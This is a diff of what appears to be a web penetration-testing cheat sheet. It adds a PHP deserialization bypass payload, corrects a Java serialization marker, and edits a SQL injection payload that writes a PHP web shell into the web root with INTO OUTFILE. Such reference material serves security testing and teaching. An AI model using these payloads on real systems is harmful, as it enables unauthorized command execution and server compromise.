@@ -386,8 +386,8 @@ example/class.php
   
 #### Trick Bypass
 
-
- 
+a:2:{s:8:"anything";o:4:"Okay":1:{s:8:"filepath";s:11:"/tmp/ok.txt";}}
+  
 ### .NET Deserialization
 
 #### Methods Serialization:
@@ -418,7 +418,7 @@ https://github.com/pwntester/ysoserial.net
 
 -> binary with ac ed 00 05
 
--> base64 starts with RO0AB in web applications
+-> base64 starts with rO0AB in web applications
 
 ### Tools
 
@@ -534,7 +534,7 @@ https://github.com/OWASP/www-community/blob/master/pages/attacks/SQL_Injection_B
  
 ### Webshell via SQLI
   
-' union select 1, 2, 3,"<\?php system($_GET['cmd']);\?>" into outfile"/var/www/html/pdp.php" -- -
+' union select 1, 2, 3,"<\?php system($_GET['cmd']);\?>" into outfile"/var/www/html/pdp.php"-- -
   
 ## NOSQL Injection
   
